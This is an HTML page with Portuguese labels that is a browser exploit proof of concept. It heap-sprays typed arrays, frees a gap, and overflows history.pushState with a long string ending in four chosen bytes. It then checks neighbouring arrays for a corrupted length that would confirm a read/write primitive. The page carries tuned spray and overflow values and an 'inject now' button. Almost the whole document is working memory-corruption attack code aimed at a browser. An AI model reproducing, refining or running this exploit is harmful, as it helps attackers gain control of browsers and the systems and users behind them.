<!DOCTYPE html>
<html>
<head>
    <title>Payload Winner: The Golden Byte</title>
    <style>
        body { background: #001a00; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
        .panel { border: 2px solid #00ff00; padding: 20px; background: #000; margin-bottom: 20px; text-align: center; }
        .log { height: 350px; overflow-y: scroll; border: 1px solid #004400; padding: 10px; background: #001100; color: #fff; text-align: left; }
        
        .big-btn { 
            padding: 15px 30px; cursor: pointer; background: #003300; 
            color: #fff; border: 2px solid #0f0; font-weight: bold; font-size: 18px; margin: 10px; 
            box-shadow: 0 0 10px #0f0;
        }
        .big-btn:hover { background: #0f0; color: #000; }
        
        input { background: #111; border: 1px solid #0f0; color: #0f0; padding: 8px; width: 50px; text-align: center; font-size: 18px; }
    </style>
</head>
<body>
    <h1>RCE UNLOCKED: SAFE MODE</h1>
    <div class="panel">
        <p>Configuração Estável: Hole <strong>168</strong> | Base <strong>709518</strong></p>
        <p>EDITAR BYTES DE OVERFLOW (HEX):</p>
        
        <div style="display:flex; justify-content:center; gap:10px; margin-bottom: 15px;">
            <input type="text" id="b1" value="00">
            <input type="text" id="b2" value="04">
            <input type="text" id="b3" value="00">
            <input type="text" id="b4" value="00">
        </div>

        <button class="big-btn" onclick="setHex('00','05','00','00')">TESTE 1: Pequeno (1280)</button>
        <button class="big-btn" onclick="setHex('00','20','00','00')">TESTE 2: Médio (8192)</button>
        <button class="big-btn" onclick="setHex('00','00','10','00')">TESTE 3: GIGANTE (1MB)</button>
    </div>

    <button onclick="runTest()" style="width:100%; padding:15px; background:#222; color:#fff; border:1px solid #555;">INJETAR AGORA</button>

    <div id="logger" class="log">Sistema pronto. Clique no TESTE 1 primeiro.</div>

    <script>
        const logger = document.getElementById('logger');
        // SEUS VALORES DESCOBERTOS
        const BASE_SIZE = 709518; 
        const HOLE_SIZE = 168;    
        
        const SPRAY_SIZE = 8000;
        const MAGIC_NUM = 0x41414141;

        var spray = [];

        function log(msg, type='') {
            const d = document.createElement('div');
            d.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
            if(type === 'success') { d.style.color = '#55ff55'; d.style.fontWeight = 'bold'; d.style.fontSize = '16px'; }
            logger.appendChild(d);
            logger.scrollTop = logger.scrollHeight;
        }

        function setHex(h1, h2, h3, h4) {
            document.getElementById('b1').value = h1;
            document.getElementById('b2').value = h2;
            document.getElementById('b3').value = h3;
            document.getElementById('b4').value = h4;
        }

        async function runTest() {
            let h1 = parseInt(document.getElementById('b1').value, 16);
            let h2 = parseInt(document.getElementById('b2').value, 16);
            let h3 = parseInt(document.getElementById('b3').value, 16);
            let h4 = parseInt(document.getElementById('b4').value, 16);

            log("---------------------------------------");
            log(`INJETANDO: ${document.getElementById('b1').value} ${document.getElementById('b2').value} ${document.getElementById('b3').value} ${document.getElementById('b4').value}`);

            // Limpeza
            spray = null;
            if(window.gc) window.gc();
            await new Promise(r => setTimeout(r, 200));
            spray = [];

            // Spray
            for(let i=0; i < SPRAY_SIZE; i++) {
                let arr = new Uint32Array(1024);
                arr[0] = MAGIC_NUM;
                arr[1] = i;
                spray.push(arr);
            }

            // Buraco
            let center = 4000;
            for(let i=0; i < HOLE_SIZE; i++) {
                spray[center + i] = null;
            }

            log("Aguardando GC (Alinhamento)...");
            await new Promise(r => setTimeout(r, 800));

            try {
                // Base
                let base = new Array(BASE_SIZE + 1).join('A');
                
                // Overflow
                let overflow = String.fromCharCode(h1, h2, h3, h4);
                
                let payload = base + overflow;

                history.pushState({}, "pwn_" + Date.now(), payload);
                
                checkCorruption(HOLE_SIZE, center);

            } catch(e) {
                log("ERRO CRÍTICO: " + e.message);
            }
        }

        function checkCorruption(holeUsed, startIdx) {
            let found = false;
            let limit = startIdx + holeUsed + 60;

            for(let i = startIdx + holeUsed; i < limit; i++) {
                if (i >= spray.length) break;
                let arr = spray[i];
                if(arr) {
                    // SE O TAMANHO MUDAR, GANHAMOS O JOGO
                    if(arr.length !== 1024) {
                        found = true;
                        
                        document.body.innerHTML = "";
                        document.body.style.background = "green";
                        document.body.style.textAlign = "center";
                        document.body.style.paddingTop = "100px";
                        
                        let h1 = document.createElement("h1");
                        h1.innerText = "PRIMITIVA R/W CONFIRMADA!";
                        h1.style.fontSize = "50px";
                        h1.style.color = "white";
                        
                        let p = document.createElement("p");
                        p.innerText = `Index: ${i} | Novo Length: ${arr.length}`;
                        p.style.fontSize = "30px";
                        p.style.color = "white";

                        document.body.appendChild(h1);
                        document.body.appendChild(p);
                        
                        alert("SUCESSO! Length alterado para " + arr.length);
                        return;
                    }
                    
                    if(arr[0] !== MAGIC_NUM) {
                        found = true;
                        log(`DADOS CORROMPIDOS no Index ${i}, mas Length intacto.`, "success");
                    }
                }
            }
            if(!found) {
                log("Nada aconteceu. Tente outro valor HEX.");
            }
        }
    </script>
</body>
</html>
